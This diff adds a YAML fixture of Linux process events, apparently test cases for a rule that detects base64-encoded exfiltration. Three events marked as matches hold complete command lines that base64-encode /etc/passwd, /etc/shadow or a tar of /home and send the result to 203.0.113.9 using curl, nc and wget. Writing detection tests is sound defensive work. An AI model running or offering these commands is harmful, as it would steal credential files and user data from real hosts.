@@ -1,0 +1,66 @@
+docs:
+- id: curl
+  match: true
+  doc:
+    host:
+      os: {type: linux}
+      name: srv1
+    user: {name: eve}
+    event: {category: process, type: start}
+    process:
+      name: bash
+      executable: /usr/bin/bash
+      command_line: bash -c 'curl -d "$(base64 /etc/passwd)" http://203.0.113.9/'
+      parent: {name: bash}
+- id: nc
+  match: true
+  doc:
+    host:
+      os: {type: linux}
+      name: srv1
+    user: {name: eve}
+    event: {category: process, type: start}
+    process:
+      name: bash
+      executable: /usr/bin/bash
+      command_line: bash -c 'tar c /home | base64 | nc 203.0.113.9 4444'
+      parent: {name: bash}
+- id: wget
+  match: true
+  doc:
+    host:
+      os: {type: linux}
+      name: srv1
+    user: {name: eve}
+    event: {category: process, type: start}
+    process:
+      name: bash
+      executable: /usr/bin/bash
+      command_line: bash -c 'base64 /etc/shadow | wget --post-data=@- http://203.0.113.9'
+      parent: {name: bash}
+- id: decode
+  match: false
+  doc:
+    host:
+      os: {type: linux}
+      name: srv1
+    user: {name: eve}
+    event: {category: process, type: start}
+    process:
+      name: base64
+      executable: /usr/bin/base64
+      command_line: base64 -d payload.b64
+      parent: {name: bash}
+- id: curl-plain
+  match: false
+  doc:
+    host:
+      os: {type: linux}
+      name: srv1
+    user: {name: eve}
+    event: {category: process, type: start}
+    process:
+      name: curl
+      executable: /usr/bin/curl
+      command_line: curl -sS https://example.com
+      parent: {name: bash}
